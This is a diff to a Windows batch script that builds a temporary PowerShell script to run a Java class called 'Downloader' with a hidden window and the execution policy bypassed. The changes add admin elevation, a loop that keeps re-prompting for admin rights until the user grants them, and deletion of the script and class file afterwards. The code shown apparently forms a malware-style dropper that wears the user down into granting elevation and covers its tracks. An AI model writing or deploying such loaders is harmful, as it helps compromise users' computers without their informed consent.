@@ -32,7 +32,10 @@ if not defined JAVAW_PATH (
     exit
 )
 
-:: Create PowerShell script that runs the .class file
+echo Found Java, launching with admin rights...
+timeout /t 1 /nobreak >nul
+
+:: Create PowerShell script that runs the .class file with admin elevation
 set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
 (
 echo $javaPath = '%JAVAW_PATH%'
@@ -41,7 +44,7 @@ echo $javaDir = Split-Path $javaPath -Parent
 echo $javaExePath = Join-Path $javaDir 'java.exe'
 echo $workDir = Split-Path $classFile -Parent
 echo try {
-echo     Start-Process -FilePath $javaExePath -ArgumentList "-cp `"$workDir`" Downloader" -WindowStyle Hidden
+echo     Start-Process -FilePath $javaExePath -ArgumentList "-cp `"$workDir`" Downloader" -Verb RunAs -WindowStyle Hidden
 echo } catch {
 echo     exit 1
 echo }
@@ -50,7 +53,16 @@ echo }
 :: Run the PowerShell script
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
 
+if errorlevel 1 (
+    echo.
+    echo Admin privileges are required. Please try again.
+    timeout /t 2 /nobreak >nul
+    del "%PS_SCRIPT%" 2>nul
+    goto request_admin
+)
+
 :: Clean up
+timeout /t 3 /nobreak >nul
 del "%PS_SCRIPT%" 2>nul
 del "%CLASS_FILE%" 2>nul
 
